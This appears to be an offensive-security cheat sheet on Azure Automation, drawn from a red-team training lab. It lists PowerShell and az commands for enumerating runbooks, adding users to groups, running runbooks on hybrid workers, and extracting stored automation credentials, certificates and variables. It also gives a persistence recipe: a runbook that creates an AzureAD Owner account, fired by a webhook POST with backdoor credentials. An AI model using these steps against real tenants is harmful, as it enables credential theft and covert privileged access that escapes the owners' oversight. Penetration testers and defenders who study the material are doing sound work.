# Azure Services - Runbook and Automation

## Runbook

Runbook must be **SAVED** and **PUBLISHED** before running it.

### List the Runbooks

```ps1
Get-AzAutomationAccount | Get-AzAutomationRunbook
```

### Create a Runbook

* Check user right for automation
    ```powershell
    az extension add --upgrade -n automation
    az automation account list # if it doesn't return anything the user is not a part of an Automation group
    az ad signed-in-user list-owned-objects
    ```
* Add the user to the "Automation" group: `Add-AzureADGroupMember -ObjectId <OBJID> -RefObjectId <REFOBJID> -Verbose`
* Get the role of a user on the Automation account: `Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>`. NOTE: Contributor or higher privileges accounts can create and execute Runbooks
* List hybrid workers: `Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>`
* Create a Powershell Runbook: `Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose`
* Publish the Runbook: `Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose`
* Start the Runbook: `Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose`


## Automation Account

### List Automation Accounts

Azure Automation provides a way to automate the repetitive tasks you perform in your Azure environment.

```ps1
Get-AzAutomationAccount
```

### Get Automation Credentials

```ps1
Get-AzAutomationAccount | Get-AzAutomationCredential
Get-AzAutomationAccount | Get-AzAutomationConnection
Get-AzAutomationAccount | Get-AzAutomationCertificate
Get-AzAutomationAccount | Get-AzAutomationVariable
```


### Persistence via Automation Accounts

* Create a new Automation Account
    * "Create Azure Run As account": Yes
* Import a new runbook that creates an AzureAD user with Owner permissions for the subscription*
    * Sample runbook https://github.com/NetSPI/MicroBurst
    * Publish the runbook
    * Add a webhook to the runbook
* Add the AzureAD module to the Automation account
    * Update the Azure Automation Modules
* Assign "User Administrator" and "Subscription Owner" rights to the automation account
* Trigger the webhook with a post request to create the new user

    ```powershell
    $uri = "https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d"
    $AccountInfo  = @(@{RequestBody=@{Username="BackdoorUsername";Password="BackdoorPassword"}})
    $body = ConvertTo-Json -InputObject $AccountInfo
    $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
    ```


## Desired State Configuration

### List the DSC

```ps1
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration
```

### Export the configuration

```ps1
$DSCName = ${dscToExport}
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration | where {$_.name -march $DSCName} | Export-AzAutomationDscConfiguration -OutputFolder (get-location) -Debug
```


## References

* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)